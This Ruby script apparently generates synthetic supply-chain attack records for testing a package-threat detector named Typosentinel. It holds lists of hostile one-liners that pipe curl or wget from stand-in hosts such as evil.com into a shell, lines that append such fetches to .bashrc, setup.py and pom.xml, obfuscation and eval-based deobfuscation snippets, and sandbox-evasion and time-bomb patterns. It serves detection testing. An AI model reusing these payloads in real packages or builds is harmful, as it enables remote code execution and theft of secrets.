#!/usr/bin/env ruby
# frozen_string_literal: true

# Supply Chain Attack Simulation
#
# This script simulates sophisticated supply chain attacks where legitimate
# packages are compromised or malicious packages are introduced into the
# dependency chain to test Typosentinel's detection capabilities.

require 'json'
require 'time'
require 'securerandom'
require 'base64'
require 'digest'
require 'fileutils'

class SupplyChainAttackSimulator
  attr_reader :output_dir, :attack_scenarios, :legitimate_packages

  def initialize
    @output_dir = File.join(__dir__, 'supply-chain-artifacts')
    ensure_output_dir
    
    @legitimate_packages = generate_legitimate_packages
    @attack_scenarios = {
      package_takeover: 'Compromised maintainer accounts or stolen credentials',
      dependency_injection: 'Malicious code injected into legitimate dependencies',
      build_system_compromise: 'CI/CD pipeline or build system infiltration',
      upstream_poisoning: 'Compromising packages higher up in the dependency tree',
      social_engineering: 'Tricking maintainers into including malicious code',
      abandoned_package_squat: 'Taking over abandoned but widely-used packages',
      subdependency_attack: 'Targeting less-monitored transitive dependencies',
      version_rollback: 'Forcing downgrades to vulnerable versions'
    }
    
    @malicious_techniques = {
      steganography: 'Hiding malicious code in seemingly innocent data',
      time_bomb: 'Delayed activation based on date/time conditions',
      environment_aware: 'Only activating in specific environments',
      gradual_escalation: 'Slowly increasing malicious behavior over time',
      legitimate_wrapper: 'Wrapping malicious code with legitimate functionality',
      conditional_execution: 'Only executing under specific conditions',
      obfuscation: 'Heavy code obfuscation and encryption',
      anti_analysis: 'Detecting and evading analysis environments'
    }
  end

  private

  def ensure_output_dir
    FileUtils.mkdir_p(@output_dir) unless Dir.exist?(@output_dir)
  end

  def generate_legitimate_packages
    {
      npm: [
        {
          name: 'lodash',
          version: '4.17.21',
          downloads_per_week: 50_000_000,
          maintainers: ['jdalton', 'mathias'],
          description: 'A modern JavaScript utility library',
          criticality: 'critical',
          dependencies: []
        },
        {
          name: 'express',
          version: '4.18.2',
          downloads_per_week: 25_000_000,
          maintainers: ['dougwilson', 'mikeal'],
          description: 'Fast, unopinionated, minimalist web framework',
          criticality: 'critical',
          dependencies: ['accepts', 'array-flatten', 'body-parser']
        },
        {
          name: 'axios',
          version: '1.6.0',
          downloads_per_week: 45_000_000,
          maintainers: ['mzabriskie', 'nickuraltsev'],
          description: 'Promise based HTTP client for the browser and node.js',
          criticality: 'high',
          dependencies: ['follow-redirects', 'form-data']
        }
      ],
      pypi: [
        {
          name: 'requests',
          version: '2.31.0',
          downloads_per_week: 100_000_000,
          maintainers: ['kennethreitz', 'nateprewitt'],
          description: 'Python HTTP for Humans',
          criticality: 'critical',
          dependencies: ['urllib3', 'certifi', 'charset-normalizer']
        },
        {
          name: 'numpy',
          version: '1.24.3',
          downloads_per_week: 80_000_000,
          maintainers: ['charris', 'rgommers'],
          description: 'Fundamental package for array computing in Python',
          criticality: 'critical',
          dependencies: []
        },
        {
          name: 'setuptools',
          version: '68.0.0',
          downloads_per_week: 200_000_000,
          maintainers: ['jaraco', 'abravalheri'],
          description: 'Easily download, build, install, upgrade packages',
          criticality: 'critical',
          dependencies: []
        }
      ],
      maven: [
        {
          name: 'org.springframework:spring-core',
          version: '6.0.11',
          downloads_per_week: 5_000_000,
          maintainers: ['spring-team'],
          description: 'Spring Core',
          criticality: 'critical',
          dependencies: ['org.springframework:spring-jcl']
        },
        {
          name: 'com.fasterxml.jackson.core:jackson-core',
          version: '2.15.2',
          downloads_per_week: 15_000_000,
          maintainers: ['cowtowncoder'],
          description: 'Core Jackson processing abstractions',
          criticality: 'critical',
          dependencies: []
        }
      ],
      rubygems: [
        {
          name: 'rails',
          version: '7.0.6',
          downloads_per_week: 3_000_000,
          maintainers: ['dhh', 'tenderlove', 'rafaelfranca'],
          description: 'Full-stack web application framework',
          criticality: 'critical',
          dependencies: ['actionpack', 'activerecord', 'actionview']
        },
        {
          name: 'bundler',
          version: '2.4.19',
          downloads_per_week: 50_000_000,
          maintainers: ['indirect', 'segiddins'],
          description: 'The best way to manage your application dependencies',
          criticality: 'critical',
          dependencies: []
        }
      ]
    }
  end

  public

  def generate_compromised_package(original_package, attack_type)
    {
      id: SecureRandom.uuid,
      original_package: original_package,
      attack_type: attack_type,
      compromised_version: generate_malicious_version(original_package[:version]),
      injection_point: select_injection_point(original_package),
      payload: generate_malicious_payload(attack_type),
      stealth_techniques: apply_stealth_techniques,
      persistence_mechanisms: generate_persistence_mechanisms,
      evasion_methods: generate_evasion_methods,
      target_data: generate_target_data,
      activation_conditions: generate_activation_conditions,
      timestamp: Time.now.iso8601,
      risk_score: calculate_risk_score(original_package, attack_type)
    }
  end

  def generate_malicious_version(original_version)
    parts = original_version.split('.')
    major = parts[0].to_i
    minor = parts[1].to_i
    patch = parts[2].to_i

    # Strategy: Increment patch version to appear as a legitimate update
    "#{major}.#{minor}.#{patch + 1}"
  end

  def select_injection_point(package)
    injection_points = [
      {
        location: 'main_entry_point',
        description: 'Injected into the main module entry point',
        detectability: 'high',
        impact: 'critical'
      },
      {
        location: 'dependency_resolution',
        description: 'Injected during dependency resolution process',
        detectability: 'medium',
        impact: 'high'
      },
      {
        location: 'build_script',
        description: 'Injected into build or installation scripts',
        detectability: 'low',
        impact: 'high'
      },
      {
        location: 'test_files',
        description: 'Hidden in test files that may not be scrutinized',
        detectability: 'very_low',
        impact: 'medium'
      },
      {
        location: 'documentation',
        description: 'Embedded in documentation or example code',
        detectability: 'very_low',
        impact: 'low'
      },
      {
        location: 'configuration',
        description: 'Injected into configuration files',
        detectability: 'low',
        impact: 'medium'
      }
    ]

    injection_points.sample
  end

  def generate_malicious_payload(attack_type)
    payloads = {
      package_takeover: [
        'require("child_process").exec("curl -s https://evil.com/takeover | sh")',
        'import subprocess; subprocess.run(["wget", "-qO-", "https://malicious.com/payload", "|", "sh"], shell=True)',
        'System.Diagnostics.Process.Start("powershell", "-c iex (iwr https://evil.com/ps1)")',
        'system("curl -s https://attacker.com/ruby | ruby")',
        'Runtime.getRuntime().exec("curl -s https://evil.com/java | sh")'
      ],
      dependency_injection: [
        'const originalRequire = require; require = function(id) { if (id === "fs") { /* log file access */ } return originalRequire(id); }',
        'import sys; original_import = __builtins__.__import__; __builtins__.__import__ = lambda *args: log_import(*args) or original_import(*args)',
        'AppDomain.CurrentDomain.AssemblyResolve += LogAssemblyLoad;',
        'alias_method :original_require, :require; def require(name); log_require(name); original_require(name); end',
        'ClassLoader.getSystemClassLoader().loadClass = new LoggingClassLoader()'
      ],
      build_system_compromise: [
        'echo "$(curl -s https://evil.com/build-poison)" >> ~/.bashrc',
        'echo "import os; os.system(\'curl -s https://malicious.com/python\')" >> setup.py',
        'Add-Content $PROFILE "iex (iwr https://evil.com/powershell)"',
        'echo "system(\'curl -s https://attacker.com/ruby\')" >> Rakefile',
        'echo "<exec executable=\"curl\"><arg value=\"-s\"/><arg value=\"https://evil.com/maven\"/></exec>" >> pom.xml'
      ],
      upstream_poisoning: [
        'Object.defineProperty(global, "process", { get: () => { /* exfiltrate env */ return originalProcess; } })',
        'import builtins; original_open = builtins.open; builtins.open = lambda *args, **kwargs: log_file_access(*args, **kwargs) or original_open(*args, **kwargs)',
        'System.IO.File.ReadAllText = new Func<string, string>(LogAndReadFile);',
        'class File; alias_method :original_read, :read; def read(*args); log_file_read(*args); original_read(*args); end; end',
        'Files.readAllLines = (path) -> { logFileAccess(path); return originalReadAllLines(path); }'
      ]
    }

    registry_payloads = payloads[attack_type] || payloads[:package_takeover]
    selected_payload = registry_payloads.sample

    # Add obfuscation
    obfuscate_payload(selected_payload)
  end

  def obfuscate_payload(payload)
    techniques = [
      -> (p) { Base64.strict_encode64(p) },
      -> (p) { p.chars.map { |c| "\\x#{c.ord.to_s(16)}" }.join },
      -> (p) { p.split('').map { |c| c.ord }.join(',') },
      -> (p) { Digest::SHA256.hexdigest(p)[0..15] + '_obfuscated' }
    ]

    technique = techniques.sample
    obfuscated = technique.call(payload)

    {
      original: payload,
      obfuscated: obfuscated,
      technique: technique.source_location[0].split('/').last,
      deobfuscation_hint: generate_deobfuscation_hint(obfuscated)
    }
  end

  def generate_deobfuscation_hint(obfuscated_payload)
    hints = [
      'eval(atob(payload))',
      'String.fromCharCode(...payload.split(","))',
      'Buffer.from(payload, "base64").toString()',
      'new Function(payload)()',
      'Function("return " + payload)()'
    ]
    hints.sample
  end

  def apply_stealth_techniques
    techniques = [
      {
        name: 'legitimate_functionality_wrapper',
        description: 'Wrap malicious code with legitimate functionality',
        implementation: 'function legitimateFunction() { /* actual functionality */ maliciousCode(); }'
      },
      {
        name: 'conditional_execution',
        description: 'Only execute malicious code under specific conditions',
        implementation: 'if (process.env.NODE_ENV === "production" && Math.random() < 0.01) { maliciousCode(); }'
      },
      {
        name: 'time_delayed_activation',
        description: 'Delay malicious activity to avoid immediate detection',
        implementation: 'setTimeout(() => { maliciousCode(); }, Math.random() * 86400000)' # Random delay up to 24 hours
      },
      {
        name: 'environment_fingerprinting',
        description: 'Fingerprint environment to avoid sandboxes',
        implementation: 'if (require("os").platform() !== "linux" || require("os").arch() !== "x64") { maliciousCode(); }'
      },
      {
        name: 'gradual_escalation',
        description: 'Gradually increase malicious behavior over time',
        implementation: 'const installDate = Date.now(); if (Date.now() - installDate > 604800000) { maliciousCode(); }' # After 1 week
      }
    ]

    # Select 2-4 random techniques
    techniques.sample(rand(2..4))
  end

  def generate_persistence_mechanisms
    mechanisms = [
      {
        type: 'registry_modification',
        description: 'Modify system registry for persistence',
        target: 'Windows Registry HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
      },
      {
        type: 'cron_job',
        description: 'Install cron job for periodic execution',
        target: '/etc/crontab or user crontab'
      },
      {
        type: 'startup_script',
        description: 'Add to system startup scripts',
        target: '/etc/init.d/ or ~/.bashrc'
      },
      {
        type: 'service_installation',
        description: 'Install as system service',
        target: 'systemd service or Windows service'
      },
      {
        type: 'browser_extension',
        description: 'Install malicious browser extension',
        target: 'Chrome/Firefox extension directories'
      },
      {
        type: 'package_manager_hook',
        description: 'Hook into package manager for persistence',
        target: 'npm/pip/gem post-install hooks'
      }
    ]

    mechanisms.sample(rand(1..3))
  end

  def generate_evasion_methods
    methods = [
      {
        technique: 'sandbox_detection',
        description: 'Detect and evade analysis sandboxes',
        indicators: ['VM detection', 'Analysis tool detection', 'Unusual system behavior']
      },
      {
        technique: 'anti_debugging',
        description: 'Prevent debugging and reverse engineering',
        indicators: ['Debugger detection', 'Code integrity checks', 'Anti-disassembly']
      },
      {
        technique: 'network_evasion',
        description: 'Evade network-based detection',
        indicators: ['Domain fronting', 'Encrypted C2', 'DNS tunneling']
      },
      {
        technique: 'behavioral_mimicry',
        description: 'Mimic legitimate software behavior',
        indicators: ['Normal API usage patterns', 'Legitimate network traffic', 'Expected file operations']
      },
      {
        technique: 'polymorphic_code',
        description: 'Change code structure while maintaining functionality',
        indicators: ['Dynamic code generation', 'Variable obfuscation', 'Control flow obfuscation']
      }
    ]

    methods.sample(rand(2..4))
  end

  def generate_target_data
    targets = [
      {
        type: 'environment_variables',
        description: 'Steal environment variables and secrets',
        value: 'API keys, database credentials, tokens'
      },
      {
        type: 'source_code',
        description: 'Exfiltrate proprietary source code',
        value: 'Intellectual property, algorithms, business logic'
      },
      {
        type: 'configuration_files',
        description: 'Access configuration and settings',
        value: 'Database configs, API endpoints, internal URLs'
      },
      {
        type: 'user_data',
        description: 'Collect user information and credentials',
        value: 'Personal data, authentication tokens, session data'
      },
      {
        type: 'system_information',
        description: 'Gather system and network information',
        value: 'Network topology, installed software, system specs'
      },
      {
        type: 'build_artifacts',
        description: 'Access build outputs and deployment info',
        value: 'Compiled binaries, deployment keys, infrastructure details'
      }
    ]

    targets.sample(rand(2..5))
  end

  def generate_activation_conditions
    conditions = [
      {
        type: 'time_based',
        condition: 'Date.now() > new Date("2024-01-01").getTime()',
        description: 'Activate after specific date'
      },
      {
        type: 'environment_based',
        condition: 'process.env.NODE_ENV === "production"',
        description: 'Only activate in production environment'
      },
      {
        type: 'usage_based',
        condition: 'require("fs").existsSync("/etc/passwd")',
        description: 'Activate on Unix-like systems'
      },
      {
        type: 'network_based',
        condition: 'require("os").networkInterfaces().eth0',
        description: 'Activate when specific network interface exists'
      },
      {
        type: 'file_based',
        condition: 'require("fs").existsSync("./package.json")',
        description: 'Activate in Node.js projects'
      },
      {
        type: 'random_based',
        condition: 'Math.random() < 0.1',
        description: 'Activate randomly (10% chance)'
      }
    ]

    conditions.sample(rand(1..3))
  end

  def calculate_risk_score(package, attack_type)
    base_score = 0

    # Package popularity impact
    downloads = package[:downloads_per_week]
    if downloads > 50_000_000
      base_score += 10
    elsif downloads > 10_000_000
      base_score += 8
    elsif downloads > 1_000_000
      base_score += 6
    else
      base_score += 4
    end

    # Criticality impact
    criticality_scores = { 'critical' => 4, 'high' => 3, 'medium' => 2, 'low' => 1 }
    base_score += criticality_scores[package[:criticality]] || 1

    # Attack type impact
    attack_scores = {
      package_takeover: 5,
      dependency_injection: 4,
      build_system_compromise: 4,
      upstream_poisoning: 5,
      social_engineering: 3,
      abandoned_package_squat: 3,
      subdependency_attack: 2,
      version_rollback: 2
    }
    base_score += attack_scores[attack_type] || 2

    # Dependency count impact (more dependencies = higher risk)
    base_score += package[:dependencies].length * 0.5

    [base_score, 20].min # Cap at 20
  end

  def simulate_supply_chain_campaign
    puts "🎯 Simulating Supply Chain Attack Campaign..."
    
    compromised_packages = []
    
    @legitimate_packages.each do |registry, packages|
      packages.each do |package|
        # Simulate multiple attack vectors per package
        attack_types = @attack_scenarios.keys.sample(rand(1..3))
        
        attack_types.each do |attack_type|
          compromised = generate_compromised_package(package.merge(registry: registry), attack_type)
          compromised_packages << compromised
        end
      end
    end
    
    puts "✅ Generated #{compromised_packages.length} compromised packages across #{@legitimate_packages.keys.length} registries"
    
    compromised_packages
  end

  def analyze_attack_campaign(compromised_packages)
    analysis = {
      total_packages: compromised_packages.length,
      registries_affected: compromised_packages.map { |p| p[:original_package][:registry] }.uniq.length,
      attack_types: {},
      risk_distribution: { low: 0, medium: 0, high: 0, critical: 0 },
      injection_points: {},
      stealth_techniques: {},
      evasion_methods: {},
      target_data_types: {},
      persistence_mechanisms: {},
      high_impact_targets: [],
      detection_challenges: {
        time_delayed: 0,
        environment_specific: 0,
        heavily_obfuscated: 0,
        legitimate_wrapper: 0,
        sandbox_evasive: 0
      }
    }

    compromised_packages.each do |package|
      # Attack types
      attack_type = package[:attack_type]
      analysis[:attack_types][attack_type] = (analysis[:attack_types][attack_type] || 0) + 1

      # Risk distribution
      risk_score = package[:risk_score]
      if risk_score >= 15
        analysis[:risk_distribution][:critical] += 1
      elsif risk_score >= 10
        analysis[:risk_distribution][:high] += 1
      elsif risk_score >= 5
        analysis[:risk_distribution][:medium] += 1
      else
        analysis[:risk_distribution][:low] += 1
      end

      # Injection points
      injection_point = package[:injection_point][:location]
      analysis[:injection_points][injection_point] = (analysis[:injection_points][injection_point] || 0) + 1

      # Stealth techniques
      package[:stealth_techniques].each do |technique|
        name = technique[:name]
        analysis[:stealth_techniques][name] = (analysis[:stealth_techniques][name] || 0) + 1
      end

      # Evasion methods
      package[:evasion_methods].each do |method|
        technique = method[:technique]
        analysis[:evasion_methods][technique] = (analysis[:evasion_methods][technique] || 0) + 1
      end

      # Target data types
      package[:target_data].each do |target|
        type = target[:type]
        analysis[:target_data_types][type] = (analysis[:target_data_types][type] || 0) + 1
      end

      # Persistence mechanisms
      package[:persistence_mechanisms].each do |mechanism|
        type = mechanism[:type]
        analysis[:persistence_mechanisms][type] = (analysis[:persistence_mechanisms][type] || 0) + 1
      end

      # High impact targets
      if package[:original_package][:downloads_per_week] > 10_000_000
        analysis[:high_impact_targets] << {
          name: package[:original_package][:name],
          downloads: package[:original_package][:downloads_per_week],
          attack_type: attack_type,
          risk_score: risk_score
        }
      end

      # Detection challenges
      stealth_names = package[:stealth_techniques].map { |t| t[:name] }
      evasion_names = package[:evasion_methods].map { |m| m[:technique] }
      
      analysis[:detection_challenges][:time_delayed] += 1 if stealth_names.include?('time_delayed_activation')
      analysis[:detection_challenges][:environment_specific] += 1 if stealth_names.include?('environment_fingerprinting')
      analysis[:detection_challenges][:legitimate_wrapper] += 1 if stealth_names.include?('legitimate_functionality_wrapper')
      analysis[:detection_challenges][:sandbox_evasive] += 1 if evasion_names.include?('sandbox_detection')
    end

    analysis
  end

  def save_simulation_results(compromised_packages, analysis)
    timestamp = Time.now.to_i
    
    # Save detailed package data
    packages_file = File.join(@output_dir, "supply-chain-packages-#{timestamp}.json")
    packages_data = {
      timestamp: Time.now.iso8601,
      simulation_type: 'supply_chain_attack',
      total_packages: compromised_packages.length,
      packages: compromised_packages
    }
    
    File.write(packages_file, JSON.pretty_generate(packages_data))
    
    # Save analysis report
    analysis_file = File.join(@output_dir, "supply-chain-analysis-#{timestamp}.json")
    analysis_data = {
      timestamp: Time.now.iso8601,
      simulation_type: 'supply_chain_attack',
      analysis: analysis,
      legitimate_packages: @legitimate_packages,
      attack_scenarios: @attack_scenarios
    }
    
    File.write(analysis_file, JSON.pretty_generate(analysis_data))
    
    puts "💾 Simulation results saved:"
    puts "   Packages: #{packages_file}"
    puts "   Analysis: #{analysis_file}"
    
    analysis_file
  end

  def run_simulation
    puts "🚨 Starting Supply Chain Attack Simulation"
    puts "=" * 60
    
    # Generate compromised packages
    compromised_packages = simulate_supply_chain_campaign
    
    # Analyze attack campaign
    analysis = analyze_attack_campaign(compromised_packages)
    
    # Save results
    analysis_file = save_simulation_results(compromised_packages, analysis)
    
    # Print summary
    puts "\n📊 Supply Chain Attack Summary:"
    puts "Total compromised packages: #{analysis[:total_packages]}"
    puts "Registries affected: #{analysis[:registries_affected]}"
    puts "Critical risk packages: #{analysis[:risk_distribution][:critical]}"
    puts "High impact targets: #{analysis[:high_impact_targets].length}"
    puts "Time-delayed attacks: #{analysis[:detection_challenges][:time_delayed]}"
    puts "Sandbox-evasive attacks: #{analysis[:detection_challenges][:sandbox_evasive]}"
    
    {
      packages: compromised_packages,
      analysis: analysis,
      analysis_file: analysis_file
    }
  end
end

# CLI execution
if __FILE__ == $0
  simulator = SupplyChainAttackSimulator.new
  results = simulator.run_simulation
end